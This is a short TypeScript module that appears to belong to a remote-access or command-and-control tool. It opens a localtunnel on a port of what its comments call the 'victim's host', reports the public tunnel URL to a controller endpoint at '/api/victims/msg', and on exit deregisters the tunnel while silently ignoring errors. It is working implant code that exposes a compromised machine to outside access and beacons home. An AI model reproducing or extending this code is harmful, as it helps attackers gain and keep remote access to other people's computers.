import exitHook from 'async-exit-hook';
import localtunnel from 'localtunnel';
import HttpUtils from './http';

namespace TunnelUtils {
  export const init = async (port: number) => {
    // Init localtunnel instance
    const tunnel = await localtunnel({ port });
    HttpUtils.postJSON('/api/victims/msg', {
      msg: `Opens port ${port} for localtunnel at URL: ${tunnel.url}`,
    });
    // Clean-up tunnel upon close
    exitHook(() => {
      try {
        HttpUtils.postShellJSON('/api/victims/msg', {
          msg: `Closes port ${port} for localtunnel at URL: ${tunnel.url}`,
        });
        HttpUtils.deleteShellJSON('/api/victims/tunnels', {
          tunnelURL: tunnel.url,
        });
      } catch (err) {
        // Ignore exceptions on victim's host
      }

      tunnel.close();
    });
    return tunnel;
    // Close hook
    // tunnel.on('close', () => {});
  };
}

export default TunnelUtils;
